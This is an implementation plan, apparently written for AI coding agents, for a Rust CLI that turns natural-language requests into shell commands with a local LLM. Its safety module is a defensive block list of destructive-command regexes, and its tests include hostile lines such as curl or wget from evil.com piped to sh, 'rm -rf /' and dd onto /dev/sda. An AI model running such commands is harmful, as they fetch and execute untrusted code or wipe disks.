# shellex Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Rust CLI tool that translates natural-language intent into shell commands (or explains given commands) using a local Ollama LLM.

**Architecture:** Single-binary monolithic Rust crate with 9 modules: cli, config, context, prompt, safety, ollama, interactive, explain, and main. Two mutually exclusive modes (generate/explain) dispatched from main after config loading and arg parsing.

**Tech Stack:** Rust, clap (derive), tokio, ollama-rs, serde + toml, regex, crossterm, dirs, anyhow

**Spec:** `docs/superpowers/specs/2026-04-05-shellex-design.md`

---

### Task 1: Project Scaffolding

**Files:**
- Create: `Cargo.toml`
- Create: `src/main.rs`
- Create: `src/cli.rs`
- Create: `src/config.rs`
- Create: `src/context.rs`
- Create: `src/prompt.rs`
- Create: `src/safety.rs`
- Create: `src/ollama.rs`
- Create: `src/interactive.rs`
- Create: `src/explain.rs`

- [ ] **Step 1: Initialize Cargo project**

Run: `cargo init --name shellex /home/mihai/work/sysop/shellex`

- [ ] **Step 2: Set up Cargo.toml with all dependencies**

```toml
[package]
name = "shellex"
version = "0.1.0"
edition = "2021"
description = "Translate natural-language intent to shell commands using a local LLM"

[dependencies]
clap = { version = "4", features = ["derive"] }
tokio = { version = "1", features = ["full"] }
ollama-rs = { version = "0.2", features = ["chat-history"] }
serde = { version = "1", features = ["derive"] }
toml = "0.8"
regex = "1"
crossterm = "0.28"
dirs = "5"
anyhow = "1"
```

- [ ] **Step 3: Create empty module files**

Create each file with a placeholder comment:

`src/main.rs`:
```rust
mod cli;
mod config;
mod context;
mod explain;
mod interactive;
mod ollama;
mod prompt;
mod safety;

fn main() {
    println!("shellex - not yet implemented");
}
```

`src/cli.rs`:
```rust
// CLI argument parsing via clap derive
```

`src/config.rs`:
```rust
// Config file loading and defaults
```

`src/context.rs`:
```rust
// Environment detection for --ctx flag
```

`src/explain.rs`:
```rust
// Command tokenizer for explain mode
```

`src/interactive.rs`:
```rust
// Interactive confirmation prompt with inline editing
```

`src/ollama.rs`:
```rust
// Ollama API wrapper
```

`src/prompt.rs`:
```rust
// System/user prompt construction for both modes
```

`src/safety.rs`:
```rust
// Dangerous command pattern detection
```

- [ ] **Step 4: Verify it compiles**

Run: `cd /home/mihai/work/sysop/shellex && cargo build`
Expected: Compiles successfully (warnings about unused modules are fine)

- [ ] **Step 5: Initialize git and commit**

```bash
cd /home/mihai/work/sysop/shellex
git init
git add Cargo.toml Cargo.lock src/
git commit -m "feat: scaffold shellex project with module structure"
```

---

### Task 2: CLI Parsing (`cli.rs`)

**Files:**
- Modify: `src/cli.rs`
- Test: `src/cli.rs` (in-module tests)

- [ ] **Step 1: Write failing tests for CLI parsing**

```rust
// src/cli.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_mode_basic() {
        let args = Args::parse_from(["shellex", "find large files"]);
        assert_eq!(args.input, "find large files");
        assert!(!args.explain);
        assert!(!args.ctx);
        assert!(!args.yes);
        assert!(args.model.is_none());
    }

    #[test]
    fn test_explain_mode() {
        let args = Args::parse_from(["shellex", "-e", "tar czf - /var/log"]);
        assert!(args.explain);
        assert_eq!(args.input, "tar czf - /var/log");
    }

    #[test]
    fn test_ctx_flag() {
        let args = Args::parse_from(["shellex", "--ctx", "list services"]);
        assert!(args.ctx);
        assert_eq!(args.input, "list services");
    }

    #[test]
    fn test_yes_and_dry_run() {
        let args = Args::parse_from(["shellex", "--yes", "--dry-run", "echo hello"]);
        assert!(args.yes);
        assert!(args.dry_run);
    }

    #[test]
    fn test_force_flag() {
        let args = Args::parse_from(["shellex", "--yes", "--force", "delete everything"]);
        assert!(args.yes);
        assert!(args.force);
    }

    #[test]
    fn test_model_override() {
        let args = Args::parse_from(["shellex", "--model", "gemma:7b", "query"]);
        assert_eq!(args.model, Some("gemma:7b".to_string()));
    }

    #[test]
    fn test_verbose_flag() {
        let args = Args::parse_from(["shellex", "--verbose", "query"]);
        assert!(args.verbose);
    }

    #[test]
    fn test_config_path_override() {
        let args = Args::parse_from(["shellex", "--config", "/tmp/my.toml", "query"]);
        assert_eq!(args.config, Some(std::path::PathBuf::from("/tmp/my.toml")));
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib cli`
Expected: FAIL — `Args` struct not defined

- [ ] **Step 3: Implement the Args struct**

```rust
// src/cli.rs
use clap::Parser;
use std::path::PathBuf;

/// Translate natural-language intent to shell commands, or explain existing commands.
#[derive(Parser, Debug)]
#[command(name = "shellex", version, about)]
pub struct Args {
    /// The natural-language intent (generate mode) or command to explain (with -e)
    pub input: String,

    /// Explain mode: interpret the input as a shell command and explain it
    #[arg(short = 'e', long = "explain")]
    pub explain: bool,

    /// Gather environment context (OS, shell, installed tools) for better results
    #[arg(long)]
    pub ctx: bool,

    /// Skip confirmation and execute immediately (for scripting)
    #[arg(long)]
    pub yes: bool,

    /// With --yes: print command to stdout without executing
    #[arg(long = "dry-run")]
    pub dry_run: bool,

    /// Allow --yes to proceed even on dangerous commands
    #[arg(long)]
    pub force: bool,

    /// Override the model from config
    #[arg(long)]
    pub model: Option<String>,

    /// Path to custom config file
    #[arg(long)]
    pub config: Option<PathBuf>,

    /// Show the full prompt sent to the LLM
    #[arg(long)]
    pub verbose: bool,
}

#[cfg(test)]
mod tests {
    // ... tests from step 1 ...
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib cli`
Expected: All 8 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/cli.rs
git commit -m "feat: implement CLI argument parsing with clap derive"
```

---

### Task 3: Config Loading (`config.rs`)

**Files:**
- Modify: `src/config.rs`
- Test: `src/config.rs` (in-module tests)

- [ ] **Step 1: Write failing tests for config**

```rust
// src/config.rs

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_default_config() {
        let config = Config::default();
        assert_eq!(config.model, "llama3");
        assert_eq!(config.ollama_url, "http://localhost:11434");
        assert!(!config.yes_warned);
        assert!(!config.dangerous_patterns.is_empty());
        assert!(!config.ctx_tools.is_empty());
        assert_eq!(config.custom_prompt, "");
    }

    #[test]
    fn test_toml_roundtrip() {
        let config = Config::default();
        let serialized = toml::to_string_pretty(&config).unwrap();
        let deserialized: Config = toml::from_str(&serialized).unwrap();
        assert_eq!(config.model, deserialized.model);
        assert_eq!(config.ollama_url, deserialized.ollama_url);
        assert_eq!(config.dangerous_patterns.len(), deserialized.dangerous_patterns.len());
        assert_eq!(config.ctx_tools.len(), deserialized.ctx_tools.len());
    }

    #[test]
    fn test_load_from_file() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let mut file = std::fs::File::create(&path).unwrap();
        write!(file, r#"
model = "gemma:7b"
ollama_url = "http://myhost:11434"
yes_warned = true
dangerous_patterns = ["rm -rf"]
ctx_tools = ["git"]
custom_prompt = "prefer ripgrep"
"#).unwrap();

        let config = Config::load_from(&path).unwrap();
        assert_eq!(config.model, "gemma:7b");
        assert_eq!(config.ollama_url, "http://myhost:11434");
        assert!(config.yes_warned);
        assert_eq!(config.dangerous_patterns, vec!["rm -rf"]);
        assert_eq!(config.ctx_tools, vec!["git"]);
        assert_eq!(config.custom_prompt, "prefer ripgrep");
    }

    #[test]
    fn test_load_creates_default_if_missing() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("shellex").join("config.toml");
        let config = Config::load_or_create(&path).unwrap();
        assert_eq!(config.model, "llama3");
        assert!(path.exists());
    }

    #[test]
    fn test_config_path_default() {
        let path = Config::default_path();
        // Should end with shellex/config.toml
        assert!(path.ends_with("shellex/config.toml"));
    }
}
```

- [ ] **Step 2: Add tempfile dev-dependency**

Add to `Cargo.toml`:
```toml
[dev-dependencies]
tempfile = "3"
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib config`
Expected: FAIL — `Config` struct not defined

- [ ] **Step 4: Implement Config**

```rust
// src/config.rs
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Config {
    pub model: String,
    pub ollama_url: String,
    pub yes_warned: bool,
    pub dangerous_patterns: Vec<String>,
    pub ctx_tools: Vec<String>,
    pub custom_prompt: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            model: "llama3".to_string(),
            ollama_url: "http://localhost:11434".to_string(),
            yes_warned: false,
            dangerous_patterns: vec![
                r"rm\s+(-[^\s]*)?\s*/".to_string(),
                r"mkfs".to_string(),
                r"dd\s+.*of=/dev/".to_string(),
                r":\(\)\{.*\|.*&\}.*;:".to_string(),
                r"chmod\s+777".to_string(),
                r">/dev/sd".to_string(),
                r"wget.*\|.*sh".to_string(),
                r"curl.*\|.*sh".to_string(),
            ],
            ctx_tools: vec![
                "git".into(), "docker".into(), "kubectl".into(), "systemctl".into(),
                "npm".into(), "python3".into(), "pip".into(), "cargo".into(), "go".into(),
                "apt".into(), "dnf".into(), "pacman".into(), "brew".into(),
                "jq".into(), "ripgrep".into(), "fd".into(), "tmux".into(),
            ],
            custom_prompt: String::new(),
        }
    }
}

impl Config {
    pub fn default_path() -> PathBuf {
        let config_dir = dirs::config_dir().unwrap_or_else(|| PathBuf::from("~/.config"));
        config_dir.join("shellex").join("config.toml")
    }

    pub fn load_from(path: &Path) -> Result<Self> {
        let content = fs::read_to_string(path)
            .with_context(|| format!("Error: Invalid config at {}. Delete it to regenerate defaults.", path.display()))?;
        let config: Config = toml::from_str(&content)
            .with_context(|| format!("Error: Invalid config at {}. Delete it to regenerate defaults.", path.display()))?;
        Ok(config)
    }

    pub fn load_or_create(path: &Path) -> Result<Self> {
        if path.exists() {
            Self::load_from(path)
        } else {
            let config = Config::default();
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent)?;
            }
            let content = toml::to_string_pretty(&config)?;
            fs::write(path, &content)?;
            Ok(config)
        }
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        let content = toml::to_string_pretty(self)?;
        fs::write(path, &content)?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    // ... tests from step 1 ...
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib config`
Expected: All 5 tests PASS

- [ ] **Step 6: Commit**

```bash
git add Cargo.toml src/config.rs
git commit -m "feat: implement config loading with TOML serialization"
```

---

### Task 4: Safety Module (`safety.rs`)

**Files:**
- Modify: `src/safety.rs`
- Test: `src/safety.rs` (in-module tests)

- [ ] **Step 1: Write failing tests for safety checks**

```rust
// src/safety.rs

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Config;

    fn checker() -> SafetyChecker {
        SafetyChecker::new(&Config::default().dangerous_patterns).unwrap()
    }

    // Positive matches — these should be flagged
    #[test]
    fn test_rm_rf_root() {
        assert!(checker().check("rm -rf /").is_dangerous());
    }

    #[test]
    fn test_rm_rf_root_with_flags() {
        assert!(checker().check("rm -rf --no-preserve-root /").is_dangerous());
    }

    #[test]
    fn test_rm_root_no_rf() {
        assert!(checker().check("rm -r /").is_dangerous());
    }

    #[test]
    fn test_mkfs() {
        assert!(checker().check("mkfs.ext4 /dev/sda1").is_dangerous());
    }

    #[test]
    fn test_dd_to_device() {
        assert!(checker().check("dd if=/dev/zero of=/dev/sda bs=1M").is_dangerous());
    }

    #[test]
    fn test_chmod_777() {
        assert!(checker().check("chmod 777 /etc/passwd").is_dangerous());
    }

    #[test]
    fn test_curl_pipe_sh() {
        assert!(checker().check("curl https://evil.com/script.sh | sh").is_dangerous());
    }

    #[test]
    fn test_wget_pipe_sh() {
        assert!(checker().check("wget -O- https://evil.com/x | sh").is_dangerous());
    }

    // Negative matches — these should NOT be flagged
    #[test]
    fn test_rm_single_file_safe() {
        assert!(!checker().check("rm file.txt").is_dangerous());
    }

    #[test]
    fn test_rm_rf_relative_path_safe() {
        assert!(!checker().check("rm -rf ./build/").is_dangerous());
    }

    #[test]
    fn test_dd_to_file_safe() {
        assert!(!checker().check("dd if=/dev/zero of=test.img bs=1M count=100").is_dangerous());
    }

    #[test]
    fn test_chmod_644_safe() {
        assert!(!checker().check("chmod 644 file.txt").is_dangerous());
    }

    #[test]
    fn test_curl_no_pipe_safe() {
        assert!(!checker().check("curl https://example.com/api").is_dangerous());
    }

    #[test]
    fn test_normal_find_safe() {
        assert!(!checker().check("find ~/ -name '*.png' -size +5M").is_dangerous());
    }

    #[test]
    fn test_regex_set_compiles() {
        let config = Config::default();
        let result = SafetyChecker::new(&config.dangerous_patterns);
        assert!(result.is_ok());
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib safety`
Expected: FAIL — `SafetyChecker` not defined

- [ ] **Step 3: Implement SafetyChecker**

```rust
// src/safety.rs
use anyhow::Result;
use regex::RegexSet;

pub enum SafetyResult {
    Safe,
    Dangerous(Vec<String>),
}

impl SafetyResult {
    pub fn is_dangerous(&self) -> bool {
        matches!(self, SafetyResult::Dangerous(_))
    }
}

pub struct SafetyChecker {
    regex_set: RegexSet,
    patterns: Vec<String>,
}

impl SafetyChecker {
    pub fn new(patterns: &[String]) -> Result<Self> {
        let regex_set = RegexSet::new(patterns)?;
        Ok(Self {
            regex_set,
            patterns: patterns.to_vec(),
        })
    }

    pub fn check(&self, command: &str) -> SafetyResult {
        let matches: Vec<String> = self
            .regex_set
            .matches(command)
            .into_iter()
            .map(|i| self.patterns[i].clone())
            .collect();

        if matches.is_empty() {
            SafetyResult::Safe
        } else {
            SafetyResult::Dangerous(matches)
        }
    }
}

#[cfg(test)]
mod tests {
    // ... tests from step 1 ...
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib safety`
Expected: All 17 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/safety.rs
git commit -m "feat: implement dangerous command pattern detection"
```

---

### Task 5: Explain Mode Tokenizer (`explain.rs`)

**Files:**
- Modify: `src/explain.rs`
- Test: `src/explain.rs` (in-module tests)

- [ ] **Step 1: Write failing tests for tokenizer**

```rust
// src/explain.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_command() {
        let tokens = tokenize("ls -la /tmp");
        assert_eq!(tokens, vec!["ls -la /tmp"]);
    }

    #[test]
    fn test_pipe() {
        let tokens = tokenize("cat file.txt | grep error");
        assert_eq!(tokens, vec!["cat file.txt", "|", "grep error"]);
    }

    #[test]
    fn test_double_pipe_or() {
        let tokens = tokenize("cmd1 || cmd2");
        assert_eq!(tokens, vec!["cmd1", "||", "cmd2"]);
    }

    #[test]
    fn test_and_operator() {
        let tokens = tokenize("make && make install");
        assert_eq!(tokens, vec!["make", "&&", "make install"]);
    }

    #[test]
    fn test_semicolon() {
        let tokens = tokenize("echo hello; echo world");
        assert_eq!(tokens, vec!["echo hello", ";", "echo world"]);
    }

    #[test]
    fn test_single_quoted_string_preserved() {
        let tokens = tokenize("echo 'hello | world'");
        assert_eq!(tokens, vec!["echo 'hello | world'"]);
    }

    #[test]
    fn test_double_quoted_string_preserved() {
        let tokens = tokenize(r#"echo "hello | world""#);
        assert_eq!(tokens, vec![r#"echo "hello | world""#]);
    }

    #[test]
    fn test_subshell_preserved() {
        let tokens = tokenize("echo $(date +%F)");
        assert_eq!(tokens, vec!["echo $(date +%F)"]);
    }

    #[test]
    fn test_nested_subshell() {
        let tokens = tokenize("echo $(echo $(date))");
        assert_eq!(tokens, vec!["echo $(echo $(date))"]);
    }

    #[test]
    fn test_complex_pipeline() {
        let tokens = tokenize("tar czf - /var/log | ssh backup@remote 'cat > /backups/logs.tar.gz'");
        assert_eq!(tokens, vec![
            "tar czf - /var/log",
            "|",
            "ssh backup@remote 'cat > /backups/logs.tar.gz'",
        ]);
    }

    #[test]
    fn test_unmatched_quote_takes_rest() {
        let tokens = tokenize("echo 'unmatched");
        assert_eq!(tokens, vec!["echo 'unmatched"]);
    }

    #[test]
    fn test_redirect() {
        let tokens = tokenize("echo hello > output.txt");
        assert_eq!(tokens, vec!["echo hello", ">", "output.txt"]);
    }

    #[test]
    fn test_append_redirect() {
        let tokens = tokenize("echo hello >> output.txt");
        assert_eq!(tokens, vec!["echo hello", ">>", "output.txt"]);
    }

    #[test]
    fn test_stderr_redirect() {
        let tokens = tokenize("cmd 2>&1 | grep error");
        assert_eq!(tokens, vec!["cmd 2>&1", "|", "grep error"]);
    }

    #[test]
    fn test_format_segments() {
        let tokens = vec!["tar czf -".to_string(), "|".to_string(), "gzip".to_string()];
        let formatted = format_segments(&tokens);
        assert_eq!(formatted, "[1] tar czf -\n[2] |\n[3] gzip");
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib explain`
Expected: FAIL — `tokenize` function not defined

- [ ] **Step 3: Implement the tokenizer**

```rust
// src/explain.rs

/// Tokenize a shell command string into logical segments for explanation.
/// This is a best-effort heuristic splitter, not a full shell parser.
/// It splits on pipes, logical operators, semicolons, and redirections
/// while preserving quoted strings and $(...) subshells.
pub fn tokenize(input: &str) -> Vec<String> {
    let mut tokens: Vec<String> = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];

        // Handle single quotes — consume until matching quote
        if ch == '\'' {
            current.push(ch);
            i += 1;
            while i < len && chars[i] != '\'' {
                current.push(chars[i]);
                i += 1;
            }
            if i < len {
                current.push(chars[i]); // closing quote
                i += 1;
            }
            continue;
        }

        // Handle double quotes — consume until matching quote
        if ch == '"' {
            current.push(ch);
            i += 1;
            while i < len && chars[i] != '"' {
                if chars[i] == '\\' && i + 1 < len {
                    current.push(chars[i]);
                    current.push(chars[i + 1]);
                    i += 2;
                    continue;
                }
                current.push(chars[i]);
                i += 1;
            }
            if i < len {
                current.push(chars[i]); // closing quote
                i += 1;
            }
            continue;
        }

        // Handle $(...) subshells — count parens for nesting
        if ch == '$' && i + 1 < len && chars[i + 1] == '(' {
            current.push('$');
            current.push('(');
            i += 2;
            let mut depth = 1;
            while i < len && depth > 0 {
                if chars[i] == '(' {
                    depth += 1;
                } else if chars[i] == ')' {
                    depth -= 1;
                }
                current.push(chars[i]);
                i += 1;
            }
            continue;
        }

        // Handle backtick subshells
        if ch == '`' {
            current.push(ch);
            i += 1;
            while i < len && chars[i] != '`' {
                current.push(chars[i]);
                i += 1;
            }
            if i < len {
                current.push(chars[i]);
                i += 1;
            }
            continue;
        }

        // Handle || operator
        if ch == '|' && i + 1 < len && chars[i + 1] == '|' {
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push("||".to_string());
            current.clear();
            i += 2;
            continue;
        }

        // Handle | pipe
        if ch == '|' {
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push("|".to_string());
            current.clear();
            i += 1;
            continue;
        }

        // Handle && operator
        if ch == '&' && i + 1 < len && chars[i + 1] == '&' {
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push("&&".to_string());
            current.clear();
            i += 2;
            continue;
        }

        // Handle ; semicolon
        if ch == ';' {
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push(";".to_string());
            current.clear();
            i += 1;
            continue;
        }

        // Handle >> append redirect
        if ch == '>' && i + 1 < len && chars[i + 1] == '>' {
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push(">>".to_string());
            current.clear();
            i += 2;
            continue;
        }

        // Handle > redirect (but not 2>&1 which is part of the command)
        if ch == '>' {
            // Check for 2>&1 pattern — keep it as part of current token
            if i >= 1 && current.ends_with('2') && i + 2 < len && chars[i + 1] == '&' && chars[i + 2] == '1' {
                current.push('>');
                current.push('&');
                current.push('1');
                i += 3;
                continue;
            }
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push(">".to_string());
            current.clear();
            i += 1;
            continue;
        }

        // Handle < input redirect
        if ch == '<' {
            // Skip heredoc (<<) for now — treat as part of current
            if i + 1 < len && chars[i + 1] == '<' {
                current.push(ch);
                i += 1;
                continue;
            }
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                tokens.push(trimmed);
            }
            tokens.push("<".to_string());
            current.clear();
            i += 1;
            continue;
        }

        current.push(ch);
        i += 1;
    }

    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        tokens.push(trimmed);
    }

    tokens
}

/// Format tokenized segments as numbered lines for the LLM prompt.
pub fn format_segments(tokens: &[String]) -> String {
    tokens
        .iter()
        .enumerate()
        .map(|(i, t)| format!("[{}] {}", i + 1, t))
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    // ... tests from step 1 ...
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib explain`
Expected: All 15 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/explain.rs
git commit -m "feat: implement shell command tokenizer for explain mode"
```

---

### Task 6: Prompt Building (`prompt.rs`)

**Files:**
- Modify: `src/prompt.rs`
- Test: `src/prompt.rs` (in-module tests)

- [ ] **Step 1: Write failing tests for prompt construction**

```rust
// src/prompt.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_system_prompt_no_context() {
        let prompt = build_generate_system_prompt("Linux", "/bin/bash", None, "");
        assert!(prompt.contains("shell command generator"));
        assert!(prompt.contains("OS: Linux"));
        assert!(prompt.contains("Shell: /bin/bash"));
        assert!(!prompt.contains("Package manager"));
    }

    #[test]
    fn test_generate_system_prompt_with_context() {
        let ctx = "Package manager: apt\nAvailable tools: git, docker";
        let prompt = build_generate_system_prompt("Linux", "/bin/bash", Some(ctx), "");
        assert!(prompt.contains("Package manager: apt"));
        assert!(prompt.contains("Available tools: git, docker"));
    }

    #[test]
    fn test_generate_system_prompt_with_custom() {
        let prompt = build_generate_system_prompt("Linux", "/bin/bash", None, "prefer ripgrep over grep");
        assert!(prompt.contains("prefer ripgrep over grep"));
    }

    #[test]
    fn test_explain_system_prompt() {
        let prompt = build_explain_system_prompt();
        assert!(prompt.contains("shell command explainer"));
        assert!(prompt.contains("Summary:"));
        assert!(prompt.contains("Breakdown:"));
    }

    #[test]
    fn test_parse_response_clean() {
        let response = "find ~/ -name '*.png' -size +5M";
        assert_eq!(parse_generate_response(response), "find ~/ -name '*.png' -size +5M");
    }

    #[test]
    fn test_parse_response_strips_code_fences() {
        let response = "```bash\nfind ~/ -name '*.png'\n```";
        assert_eq!(parse_generate_response(response), "find ~/ -name '*.png'");
    }

    #[test]
    fn test_parse_response_strips_plain_fences() {
        let response = "```\nls -la\n```";
        assert_eq!(parse_generate_response(response), "ls -la");
    }

    #[test]
    fn test_parse_response_takes_first_line() {
        let response = "ls -la\nfind /tmp";
        assert_eq!(parse_generate_response(response), "ls -la");
    }

    #[test]
    fn test_parse_response_trims_whitespace() {
        let response = "  ls -la  \n";
        assert_eq!(parse_generate_response(response), "ls -la");
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib prompt`
Expected: FAIL — functions not defined

- [ ] **Step 3: Implement prompt builders**

```rust
// src/prompt.rs
use regex::Regex;

const GENERATE_SYSTEM_TEMPLATE: &str = "\
You are a shell command generator. Output ONLY the command, no explanation, \
no markdown, no backticks. One single command or pipeline.

OS: {os}
Shell: {shell}
{context_block}\
{custom_prompt}";

const EXPLAIN_SYSTEM_PROMPT: &str = "\
You are a shell command explainer. The user will provide a command broken into \
numbered segments. For each segment, explain what it does in plain English. \
Then provide a one-sentence overall summary at the top.

Format:
Summary: <one sentence>
Breakdown:
  [1] <segment> -- <explanation>
  [2] <segment> -- <explanation>
  ...";

pub fn build_generate_system_prompt(
    os: &str,
    shell: &str,
    context_block: Option<&str>,
    custom_prompt: &str,
) -> String {
    let ctx = match context_block {
        Some(block) => format!("{}\n", block),
        None => String::new(),
    };
    let custom = if custom_prompt.is_empty() {
        String::new()
    } else {
        format!("\n{}", custom_prompt)
    };

    GENERATE_SYSTEM_TEMPLATE
        .replace("{os}", os)
        .replace("{shell}", shell)
        .replace("{context_block}", &ctx)
        .replace("{custom_prompt}", &custom)
}

pub fn build_explain_system_prompt() -> String {
    EXPLAIN_SYSTEM_PROMPT.to_string()
}

pub fn parse_generate_response(response: &str) -> String {
    let trimmed = response.trim();

    // Strip markdown code fences
    let re = Regex::new(r"(?s)^```\w*\n?(.*?)\n?```$").unwrap();
    let stripped = if let Some(captures) = re.captures(trimmed) {
        captures.get(1).map_or(trimmed, |m| m.as_str()).trim()
    } else {
        trimmed
    };

    // Take only the first line if multiple lines remain
    stripped
        .lines()
        .next()
        .unwrap_or("")
        .trim()
        .to_string()
}

#[cfg(test)]
mod tests {
    // ... tests from step 1 ...
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib prompt`
Expected: All 9 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/prompt.rs
git commit -m "feat: implement prompt construction and response parsing"
```

---

### Task 7: Environment Detection (`context.rs`)

**Files:**
- Modify: `src/context.rs`
- Test: `src/context.rs` (in-module tests)

- [ ] **Step 1: Write failing tests for context gathering**

```rust
// src/context.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_os_returns_something() {
        let os = detect_os();
        assert!(!os.is_empty());
    }

    #[test]
    fn test_detect_shell_returns_something() {
        let shell = detect_shell();
        assert!(!shell.is_empty());
    }

    #[test]
    fn test_detect_package_manager_linux() {
        // On any Linux system, should return a known package manager or "unknown"
        let pm = detect_package_manager();
        // Just verify it doesn't panic and returns a string
        assert!(!pm.is_empty());
    }

    #[test]
    fn test_format_context_block() {
        let block = format_context_block(
            "Ubuntu 24.04 (Linux 6.8.0 x86_64)",
            "/bin/bash",
            "apt",
            &["git", "docker", "cargo"],
        );
        assert!(block.contains("OS: Ubuntu 24.04"));
        assert!(block.contains("Shell: /bin/bash"));
        assert!(block.contains("Package manager: apt"));
        assert!(block.contains("Available tools: git, docker, cargo"));
    }

    #[test]
    fn test_format_context_block_no_tools() {
        let block = format_context_block("Linux", "/bin/sh", "apt", &[]);
        assert!(block.contains("OS: Linux"));
        assert!(!block.contains("Available tools"));
    }

    #[tokio::test]
    async fn test_check_tools_finds_at_least_one() {
        // "sh" should exist on any Unix system
        let available = check_tools(&["sh", "nonexistent_tool_xyz123"]).await;
        assert!(available.contains(&"sh".to_string()));
        assert!(!available.contains(&"nonexistent_tool_xyz123".to_string()));
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib context`
Expected: FAIL — functions not defined

- [ ] **Step 3: Implement context detection**

```rust
// src/context.rs
use std::env;
use std::process::Command;
use tokio::task::JoinSet;

pub fn detect_os() -> String {
    // Try /etc/os-release first (Linux)
    if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
        let pretty_name = content
            .lines()
            .find(|line| line.starts_with("PRETTY_NAME="))
            .map(|line| line.trim_start_matches("PRETTY_NAME=").trim_matches('"'));

        if let Some(name) = pretty_name {
            // Append kernel info
            if let Ok(output) = Command::new("uname").arg("-r").output() {
                let kernel = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if let Ok(arch_out) = Command::new("uname").arg("-m").output() {
                    let arch = String::from_utf8_lossy(&arch_out.stdout).trim().to_string();
                    return format!("{} (Linux {} {})", name, kernel, arch);
                }
                return format!("{} (Linux {})", name, kernel);
            }
            return name.to_string();
        }
    }

    // Try sw_vers (macOS)
    if let Ok(output) = Command::new("sw_vers").arg("-productVersion").output() {
        let version = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !version.is_empty() {
            return format!("macOS {}", version);
        }
    }

    // Fallback to uname -a
    if let Ok(output) = Command::new("uname").arg("-a").output() {
        return String::from_utf8_lossy(&output.stdout).trim().to_string();
    }

    "Unknown OS".to_string()
}

pub fn detect_shell() -> String {
    env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
}

pub fn detect_package_manager() -> String {
    let checks = [
        ("apt", "apt"),
        ("dnf", "dnf"),
        ("pacman", "pacman"),
        ("brew", "brew"),
        ("zypper", "zypper"),
        ("apk", "apk"),
    ];

    for (name, cmd) in &checks {
        if Command::new("which")
            .arg(cmd)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
        {
            return name.to_string();
        }
    }

    "unknown".to_string()
}

pub async fn check_tools(tools: &[&str]) -> Vec<String> {
    let mut set = JoinSet::new();

    for tool in tools {
        let tool = tool.to_string();
        set.spawn(async move {
            let result = tokio::process::Command::new("which")
                .arg(&tool)
                .output()
                .await;
            match result {
                Ok(output) if output.status.success() => Some(tool),
                _ => None,
            }
        });
    }

    let mut available = Vec::new();
    while let Some(result) = set.join_next().await {
        if let Ok(Some(tool)) = result {
            available.push(tool);
        }
    }

    available.sort();
    available
}

pub fn format_context_block(os: &str, shell: &str, package_manager: &str, tools: &[&str]) -> String {
    let mut lines = vec![
        format!("OS: {}", os),
        format!("Shell: {}", shell),
        format!("Package manager: {}", package_manager),
    ];

    if !tools.is_empty() {
        lines.push(format!("Available tools: {}", tools.join(", ")));
    }

    lines.join("\n")
}

